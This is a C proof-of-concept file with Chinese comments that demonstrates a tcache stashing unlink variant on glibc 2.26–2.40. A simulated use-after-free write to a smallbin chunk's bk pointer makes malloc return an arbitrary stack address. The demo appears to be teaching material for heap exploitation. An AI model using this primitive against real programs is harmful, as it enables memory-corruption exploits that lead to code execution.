/*
 * 手法：增强版 tcache 暂存解链攻击（TSU+）。
 * 适用：glibc 2.26～2.40；2.41 起 smallbin 到 tcache 的流程已经重构。
 *
 * 漏洞模型：一次 UAF/越界写，能修改一个已经进入 smallbin 的 chunk 的 bk。
 * 效果：把任意一个对齐地址挂进 tcache，下一次 malloc 就会返回这个地址。
 *
 * 与标准 TSU 的区别：标准版通常靠 bck->fd 拿到一次 libc 地址写；TSU+
 * 则让 stashing 循环继续经过伪节点，从而直接拿到 target 这个 chunk。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    /* target 必须 0x10 对齐，否则高版本的 tcache_get 会因为对齐检查而退出。 */
    __attribute__((aligned(16))) size_t target[4] = {0};
    size_t *chunks[9];
    size_t *result;

    setbuf(stdout, NULL);

    /* 前 7 个最终会填满 0x110 的 tcache；第 8、9 个进入 unsorted bin，
     * fence chunk 用来阻止 chunks[7] 和 chunks[8] 相邻合并。
     */
    for (int i = 0; i < 8; ++i)
        chunks[i] = malloc(0x100);
    (void)malloc(0x20);
    chunks[8] = malloc(0x100);
    (void)malloc(0x20);              /* 阻止最后一块与 top chunk 合并 */

    for (int i = 0; i < 9; ++i)
        free(chunks[i]);

    /* 用一个 0x110 tcache 满足不了的大请求，把两个 unsorted chunk 排入
     * 0x110 的 smallbin。随后再取走两个 tcache chunk，只留下 5 个槽位。
     */
    (void)malloc(0x200);
    (void)malloc(0x100);
    (void)malloc(0x100);

    /* 漏洞模拟：
     *   victim->bk = fake_chunk_header = target - 0x10
     * stashing 过程还会执行 bck->fd = bin，所以 target+8（对应 fake->bk）
     * 必须指向一块可写的区域；这里让它指回 target 自身。
     */
    chunks[8][1] = (size_t)target - 0x10;
    target[1] = (size_t)target;

    /* calloc 在这个版本窗口里不会直接从 tcache 取块，因此会走进 smallbin
     * 的精确尺寸分支并触发 stashing。2.41 之后这条旧循环已经不存在了。
     */
    (void)calloc(1, 0x100);
    result = malloc(0x100);

    printf("[+] TSU+：结果=%p，目标=%p\n",
           (void *)result, (void *)target);
    assert(result == target);
    return 0;
}
